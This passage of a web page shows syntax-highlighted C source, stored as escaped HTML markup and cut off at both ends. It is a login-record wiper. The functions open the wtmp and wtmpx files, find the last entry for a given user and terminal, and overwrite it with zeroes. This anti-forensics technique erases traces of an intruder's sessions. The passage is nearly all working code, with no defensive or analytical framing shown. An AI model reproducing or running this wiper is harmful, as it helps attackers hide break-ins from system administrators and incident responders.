class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"cm\"\u003e/*\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e\t * Open the wtmp file and temporary file.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e\t */\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efd1\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nf\"\u003eopen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eWTMP_FILE\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eO_RDWR\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e \u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"nf\"\u003efprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estderr\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#34;ERROR: Opening %s\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eWTMP_FILE\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"cm\"\u003e/*\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e\t * Determine offset of last relevent entry.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e\t */\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003elseek\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efd1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003elong\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003esizeof\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eut\u003c/span\u003e\u003cspan class=\"p\"\u003e)),\u003c/span\u003e \u003cspan class=\"n\"\u003eSEEK_END\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"k\"\u003ewhile\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nf\"\u003eread\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efd1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"n\"\u003eut\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"k\"\u003esizeof\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eut\u003c/span\u003e\u003cspan class=\"p\"\u003e)))\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"nf\"\u003estrncmp\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eut\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eut_name\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ewho\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nf\"\u003estrlen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ewho\u003c/span\u003e\u003cspan class=\"p\"\u003e)))\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"n\"\u003eline\u003c/span\u003e \u003cspan class=\"o\"\u003e||\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eline\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t  \u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"nf\"\u003estrncmp\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eut\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eut_line\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eline\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nf\"\u003estrlen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eline\u003c/span\u003e\u003cspan class=\"p\"\u003e))))\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t  \t\u003cspan class=\"nf\"\u003ebzero\u003c/span\u003e\u003cspan class=\"p\"\u003e((\u003c/span\u003e\u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"n\"\u003eut\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"k\"\u003esizeof\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eut\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\t\u003cspan class=\"nf\"\u003elseek\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efd1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003elong\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003esizeof\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eut\u003c/span\u003e\u003cspan class=\"p\"\u003e)),\u003c/span\u003e \u003cspan class=\"n\"\u003eSEEK_CUR\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t  \t\u003cspan class=\"nf\"\u003ewrite\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efd1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"n\"\u003eut\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"k\"\u003esizeof\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eut\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t  \t\u003cspan class=\"k\"\u003ebreak\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"nf\"\u003elseek\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efd1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003elong\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003esizeof\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eut\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e \u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e \u003cspan class=\"n\"\u003eSEEK_CUR\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003eclose\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efd1\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003eprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Done.\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e/*\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e * WTMPX editing if supported.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e */\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#ifdef HAVE_UTMPX\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\u003cspan class=\"kt\"\u003evoid\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nf\"\u003ewipe_wtmpx\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003ewho\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003eline\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"kt\"\u003eint\u003c/span\u003e \t\t\u003cspan class=\"n\"\u003efd1\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"k\"\u003estruct\u003c/span\u003e \u003cspan class=\"n\"\u003eutmpx\u003c/span\u003e\t\u003cspan class=\"n\"\u003eutx\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003eprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Patching %s .... \u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eWTMPX_FILE\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003efflush\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estdout\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"cm\"\u003e/*\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e\t * Open the utmp file and temporary file.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e\t */\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efd1\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nf\"\u003eopen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eWTMPX_FILE\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eO_RDWR\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e \u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"nf\"\u003efprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estderr\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#34;ERROR: Opening %s\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eWTMPX_FILE\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"cm\"\u003e/*\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e\t * Determine offset of last relevent entry.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e\t */\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003elseek\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efd1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003elong\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003esizeof\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eutx\u003c/span\u003e\u003cspan class=\"p\"\u003e)),\u003c/span\u003e \u003cspan class=\"n\"\u003eSEEK_END\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"k\"\u003ewhile\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nf\"\u003eread\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efd1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"n\"\u003eutx\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"k\"\u003esizeof\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eutx\u003c/span\u003e\u003cspan class=\"p\"\u003e)))\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"nf\"\u003estrncmp\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eutx\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eut_name\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ewho\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nf\"\u003estrlen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ewho\u003c/span\u003e\u003cspan class=\"p\"\u003e)))\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"n\"\u003eline\u003c/span\u003e \u003cspan class=\"o\"\u003e||\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eline\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t  \u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"nf\"\u003estrncmp\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eutx\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eut_line\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eline\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nf\"\u003estrlen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eline\u003c/span\u003e\u003cspan class=\"p\"\u003e))))\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t  \t\u003cspan class=\"nf\"\u003ebzero\u003c/span\u003e\u003cspan class=\"p\"\u003e((\u003c/span\u003e\u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"n\"\u003eutx\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"k\"\u003esizeof\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eutx\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\t\u003cspan class=\"nf\"\u003elseek\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efd1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003elong\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003esizeof\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eutx\u003c/span\u003e\u003cspan class=\"p\"\u003e)),\u003c/span\u003e \u003cspan class=\"n\"\u003eSEEK_CUR\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t  \t\u003cspan class=\"nf\"\u003ewrite\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efd1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"n\"\u003eutx\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"k\"\u003esizeof\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eutx\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t  \t\u003cspan class=\"k\"\u003ebreak\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"nf\"\u003elseek\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efd1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003eint\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003esizeof\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eutx\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e \u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e \u003cspan class=\"n\"\u003eSEEK_CUR\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan 